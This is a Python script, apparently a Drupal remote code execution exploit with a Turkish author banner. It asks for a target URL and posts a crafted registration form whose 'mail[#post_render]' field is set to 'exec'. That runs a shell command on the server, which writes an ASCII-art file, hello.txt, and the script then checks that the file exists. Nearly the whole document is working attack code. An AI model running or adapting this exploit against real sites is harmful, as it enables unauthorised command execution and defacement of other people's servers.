#!/usr/bin/env python3

import sys

import requests

print ('################################################################')

print ('# Lwa Site Tarayıcı')

print ('# by ArifReis')

print ('# Thanks Lwa Team')

print ('# https://github.com/Arftaklaci/ArifReisExpo')

print ('################################################################')

print ('Provided only for educational or information purposes\n')

target = input('Enter target url (example: https://domain.ltd/): ')

# Add proxy support (eg. BURP to analyze HTTP(s) traffic)

# set verify = False if your proxy certificate is self signed

# remember to set proxies both for http and https

# 

# example:

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# verify = False

proxies = {}

verify = True

url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "   _____        .__  _______________       .__           _________      .__                   _________         __                  

  /  _  \_______|__|/ ____\______   \ ____ |__| ______  /   _____/ ____ |  | _____    _____   \_   ___ \_____  |  | _______ _______ 

 /  /_\  \_  __ \  \   __\ |       _// __ \|  |/  ___/  \_____  \_/ __ \|  | \__  \  /     \  /    \  \/\__  \ |  |/ /\__  \\_  __ \

/    |    \  | \/  ||  |   |    |   \  ___/|  |\___ \   /        \  ___/|  |__/ __ \|  Y Y  \ \     \____/ __ \|    <  / __ \|  | \/

\____|__  /__|  |__||__|   |____|_  /\___  >__/____  > /_______  /\___  >____(____  /__|_|  /  \______  (____  /__|_ \(____  /__|   

        \/                        \/     \/        \/          \/     \/          \/      \/          \/     \/     \/     \/       " | tee hello.txt'}

r = requests.post(url, proxies=proxies, data=payload, verify=verify)

check = requests.get(target + 'hello.txt', proxies=proxies, verify=verify)

if check.status_code != 200:

  sys.exit("Not exploitable")

print ('\nCheck: '+target+'hello.txt')

